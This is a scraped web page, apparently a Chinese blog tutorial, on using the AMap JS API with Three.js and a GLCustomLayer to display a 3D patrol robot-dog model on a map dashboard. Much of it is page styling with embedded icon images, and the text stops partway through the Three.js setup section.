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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">高德地图与Three.js结合实现3D大屏可视化</h2>
<blockquote>
<p>文末源码地址及视频演示</p>
</blockquote>
<h3 data-id="heading-1">前言</h3>
<p>在智慧城市安全管理场景中，如何将真实的地理信息与3D模型完美结合，实现沉浸式的可视化监控体验？本文将以巡逻犬管理系统的大屏预览功能为例，详细介绍如何通过高德地图API与Three.js深度结合，实现3D机械狗模型在地图上的实时巡逻展示。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d90f127947354a4db3812200254d99f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2ZX-WNjum5jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767748663&amp;x-signature=nYtHQVSEXuPfvfPMLDbOGpIM4Mw%3D" alt="1 整体效果 全屏展示.png" loading="lazy"/></p>
<p>该系统实现了以下核心功能：</p>
<ul>
<li>在高德地图上加载并渲染3D机械狗模型</li>
<li>实现模型沿预设路线的自动巡逻动画</li>
<li>镜头自动跟随模型移动，提供沉浸式监控体验</li>
<li>实时显示巡逻进度、告警信息等业务数据</li>
</ul>
<h3 data-id="heading-2">技术栈</h3>
<ul>
<li><strong>高德地图 JS API 2.0</strong>：提供地图底图和空间定位能力</li>
<li><strong>Three.js r157</strong>：3D模型渲染和动画控制</li>
<li><strong>Loca 2.0</strong>：高德地图数据可视化API，用于镜头跟随</li>
<li><strong>React + TypeScript</strong>：前端框架和类型支持</li>
<li><strong>TWEEN.js</strong>：补间动画库，用于平滑的模型移动</li>
</ul>
<h3 data-id="heading-3">一、高德地图初始化</h3>
<h4 data-id="heading-4">1.1 地图配置</h4>
<p>首先需要配置高德地图的加载参数，包括API Key、版本号等：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/amapConfig.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> mapConfig = {
  <span class="hljs-attr">key</span>: <span class="hljs-string">'your-amap-key'</span>,
  <span class="hljs-attr">version</span>: <span class="hljs-string">'2.0'</span>,
  <span class="hljs-title class_">Loca</span>: {
    <span class="hljs-attr">version</span>: <span class="hljs-string">'2.0.0'</span>,  <span class="hljs-comment">// Loca版本需与地图版本一致</span>
  },
};

<span class="hljs-comment">// 初始化安全配置（必须在AMapLoader.load之前调用）</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">initAmapSecurity</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span>) {
    (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">_AMapSecurityConfig</span> = {
      <span class="hljs-attr">securityJsCode</span>: <span class="hljs-string">'your-security-code'</span>,
    };
  }
};
</code></pre>
<h4 data-id="heading-5">1.2 创建地图实例</h4>
<p>使用<code>AMapLoader.load</code>加载地图API，然后创建地图实例：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置安全密钥</span>
<span class="hljs-title function_">initAmapSecurity</span>();

<span class="hljs-comment">// 加载高德地图</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">AMap</span> = <span class="hljs-keyword">await</span> <span class="hljs-title class_">AMapLoader</span>.<span class="hljs-title function_">load</span>(mapConfig);

<span class="hljs-comment">// 创建地图实例，开启3D视图模式</span>
<span class="hljs-keyword">const</span> mapInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">Map</span>(mapContainerRef.<span class="hljs-property">current</span>, {
  <span class="hljs-attr">zoom</span>: <span class="hljs-number">13</span>,
  <span class="hljs-attr">center</span>: defaultCenter,
  <span class="hljs-attr">viewMode</span>: <span class="hljs-string">'3D'</span>,  <span class="hljs-comment">// 关键：必须开启3D模式</span>
  <span class="hljs-attr">resizeEnable</span>: <span class="hljs-literal">true</span>,
});
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4989b56a6e44b00a72b24581b63902a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2ZX-WNjum5jw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767748663&amp;x-signature=gnACNSyLHuNPMoy%2B%2F%2Bp1CONWjbA%3D" alt="2 渲染高德地图日志.png" loading="lazy"/></p>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>viewMode: '3D'</code> 必须设置，否则无法使用3D相关功能</li>
<li>需要提前设置安全密钥，否则会报错</li>
</ul>
<h4 data-id="heading-6">1.3 初始化Loca容器</h4>
<p>Loca是高德地图的数据可视化容器，用于实现镜头跟随等功能：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> loca = <span class="hljs-keyword">new</span> (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-property">Loca</span>.<span class="hljs-title class_">Container</span>({
  <span class="hljs-attr">map</span>: mapInstance,
  <span class="hljs-attr">zIndex</span>: <span class="hljs-number">9</span>
});
</code></pre>
<h3 data-id="heading-7">二、创建GLCustomLayer自定义图层</h3>
<p><code>GLCustomLayer</code>是高德地图提供的WebGL自定义图层，允许我们在地图上渲染Three.js内容。</p>
<h4 data-id="heading-8">2.1 图层结构</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> customLayer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">GLCustomLayer</span>({
  <span class="hljs-attr">zIndex</span>: <span class="hljs-number">200</span>,  <span class="hljs-comment">// 图层层级，确保模型在最上层</span>
  <span class="hljs-attr">init</span>: <span class="hljs-keyword">async</span> (<span class="hljs-attr">gl</span>: <span class="hljs-built_in">any</span>) =&gt; {
    <span class="hljs-comment">// 在这里初始化Three.js场景、相机、渲染器等</span>
  },
  <span class="hljs-attr">render</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 在这里执行每帧的渲染逻辑</span>
  },
});

mapInstance.<span class="hljs-title function_">add</span>(customLayer);
</code></pre>
<h4 data-id="heading-9">2.2 初始化Three.js场景</h4>
<p>在<code>init</code>方法中创建Three.js的核心组件：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">init</span>: <span class="hljs-keyword">async</span> (<span class="hljs-attr">gl</span>: <span class="hljs-built_in">any</span>) =&gt; {
  <span class="hljs-comment">// 1. 创建透视相机</span>
  <span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(
    <span class="hljs-number">60</span>,  <span class="hljs-comment">// 视野角度</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>,  <span class="hljs-comment">// 宽高比</span>
    <span class="hljs-number">100</span>,  <span class="hljs-comment">// 近裁剪面</span>
    <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">30</span>  <span class="hljs-comment">// 远裁剪面（使用位运算表示大数值）</span>
  );
  
  <span class="hljs-comment">// 2. 创建WebGL渲染器</span>
  <span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({
    <span class="hljs-attr">context</span>: gl,  <span class="hljs-comment">// 使用地图提供的WebGL上下文</span>
    <span class="hljs-attr">antialias</span>: <span class="hljs-literal">false</span>,  <span class="hljs-comment">// 禁用抗锯齿，减少WebGL扩展需求</span>
    <span class="hljs-attr">powerPreference</span>: <span class="hljs-string">'default'</span>,
  });
  renderer.<span class="hljs-property">autoClear</span> = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 必须设置为false，否则地图底图无法显示</span>
  renderer.<span class="hljs-property">shadowMap</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 禁用阴影，避免WebGL扩展问题</span>
  
  <span class="hljs-comment">// 3. 创建场景</span>
  <span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
  
  <span class="hljs-comment">// 4. 添加光源</span>
  <span class="hljs-keyword">const</span> ambientLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">AmbientLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">1.0</span>);
  scene.<span class="hljs-title function_">add</span>(ambientLight);
  
  <span class="hljs-keyword">const</span> directionalLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">DirectionalLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">1.2</span>);
  directionalLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">1000</span>, -<span class="hljs-number">100</span>, <span class="hljs-number">900</span>);
  scene.<span class="hljs-title function_">add</span>(directionalLight);
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>renderer.autoClear = false</code> 必须设置，否则会清除地图底图</li>
